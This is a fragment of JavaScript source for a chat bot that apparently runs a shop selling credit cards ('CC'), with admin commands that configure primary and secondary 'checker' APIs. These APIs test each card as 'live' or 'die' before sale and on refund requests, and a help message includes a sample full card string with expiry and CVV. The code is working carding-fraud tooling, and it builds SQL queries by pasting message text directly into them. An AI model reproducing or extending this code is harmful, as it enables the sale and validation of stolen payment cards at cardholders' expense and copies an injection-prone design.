                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/ativarchksec===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (msg[1] === "0") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'ATIVAR_CHK_SECUNDARIO'`).run()
                Texto = `*Checker Secundário Desativado!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "1") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'ATIVAR_CHK_SECUNDARIO'`).run()
                Texto = `*Checker Secundário Ativado!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/apichkcompra===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
            FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
            if (FILA_DE_CC_A_CHECAR.length > 0) {
                Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
            if (msg[1] === "0") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'USO_APIS_CHK'`).run()
                Texto = `*AO COMPRAR UMA CC, NÃO VAI CHECAR E SIM ENTREGA-LA DIRETO.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "1") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'USO_APIS_CHK'`).run()
                Texto = `*AO COMPRAR UMA CC, APENAS A API PRIMÁRIA VAI CHECAR!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                return
            } else if (msg[1] === "2") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '2' WHERE PARAMETRO = 'USO_APIS_CHK'`).run()
                Texto = `*AO COMPRAR UMA CC, APENAS A API SECUNDÁRIA VAI CHECAR!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "3") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '3' WHERE PARAMETRO = 'USO_APIS_CHK'`).run()
                Texto = `*AO COMPRAR UMA CC, PRIMEIRO VAI CHECAR COM A API PRIMÁRIA E CASO DER DIE, VAI CHECAR COM A API SECUNDÁRIA.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/apichktrocas===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
            FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
            if (FILA_DE_CC_A_CHECAR.length > 0) {
                Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
            if (msg[1] === "1") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'CHK_REEMBOLSO_COMO'`).run()
                Texto = `*QUANDO CLIENTE SOLICITAR REEMBOLSO, A CC SERÁ CHECADA SOMENTE PELA API CHK PRIMÁRIA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "2") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '2' WHERE PARAMETRO = 'CHK_REEMBOLSO_COMO'`).run()
                Texto = `*QUANDO CLIENTE SOLICITAR REEMBOLSO, A CC SERÁ CHECADA SOMENTE PELA API CHK SECUNDÁRIA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "3") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '3' WHERE PARAMETRO = 'CHK_REEMBOLSO_COMO'`).run()
                Texto = `*QUANDO CLIENTE SOLICITAR REEMBOLSO, A CC SERÁ CHECADA PELA API DE CHK PRIMÁRIA E SE DER DIE, EM SEGUIDA A API SECUNDÁRIA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/apichkpri===") > -1 && Adms.includes(Numero)) {
            FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
            if (FILA_DE_CC_A_CHECAR.length > 0) {
                Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
            if (Mensagem_Texto.indexOf("infocc") > -1) {

            } else {
                Texto = `*FALTOU COLOCAR A PALAVRA* infocc *NA URL CHK!*

*Exemplo:*

https://api/lista=5309940904998790|04|29|429

Ficaria assim:

/apichkpri===https://api/lista=infocc

(Basta colocar infocc no lugar onde fica a cc para checar.)`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            try {
                msg = Mensagem_Texto.split("===")
                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE'`).get()["VALOR"]
                CHK_PALAVRA_DIE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE'`).get()["VALOR"]

                API_CHK_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'API_CHK'`).get()["VALOR"]
                API_CHK = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${API_CHK}' WHERE PARAMETRO = 'API_CHK'`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'HEADER_AUTORIZATION'`).run()

                Texto = `*URL DE CHECKER PRIMÁRIA ALTERADA COM SUCESSO!*

*ANTES:* ${API_CHK_Ant}

*AGORA:* ${API_CHK}

*PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}

━━━━━━━━━━━━━━━━━━━━
*OBS:* Caso tenha configurado algum header authorization da API, acabei de remover... se precisar configure com o comando abaixo:

/headauthchkpri===[CÓDIGO]

/headauthchkpri===Fulano123456789
`
